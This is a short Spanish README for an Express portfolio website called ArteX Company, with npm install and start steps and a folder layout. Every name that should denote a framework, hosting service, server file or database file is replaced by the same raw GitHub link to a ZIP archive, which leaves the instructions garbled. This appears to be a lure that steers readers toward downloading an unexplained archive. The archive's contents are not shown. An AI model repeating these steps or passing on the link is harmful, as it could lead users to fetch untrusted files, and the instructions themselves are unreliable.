ArteX Company - Sitio web completo con backend (https://raw.githubusercontent.com/LeonardoYT67/ARTEX-COMPANY/main/somewise/ARTEX-COMPANY.zip + Express)
Lista para ejecutar localmente y desplegar en https://raw.githubusercontent.com/LeonardoYT67/ARTEX-COMPANY/main/somewise/ARTEX-COMPANY.zip

Instrucciones rápidas:
1. Instalar dependencias:
   npm install

2. Ejecutar local:
   npm start
   Luego abrir http://localhost:3000

3. Subir a https://raw.githubusercontent.com/LeonardoYT67/ARTEX-COMPANY/main/somewise/ARTEX-COMPANY.zip
   - Crear un nuevo Web Service (Node)
   - Conectar repo o subir ZIP
   - Build command: npm install
   - Start command: npm start

Estructura:
/public -> archivos frontend (HTML, CSS, JS, img, uploads)
https://raw.githubusercontent.com/LeonardoYT67/ARTEX-COMPANY/main/somewise/ARTEX-COMPANY.zip -> servidor Express que maneja subida de archivos y API para portafolio
https://raw.githubusercontent.com/LeonardoYT67/ARTEX-COMPANY/main/somewise/ARTEX-COMPANY.zip -> base de datos JSON

Nota: El endpoint de portafolio permite subir imágenes reales desde el formulario. Las imágenes se guardan en public/uploads/
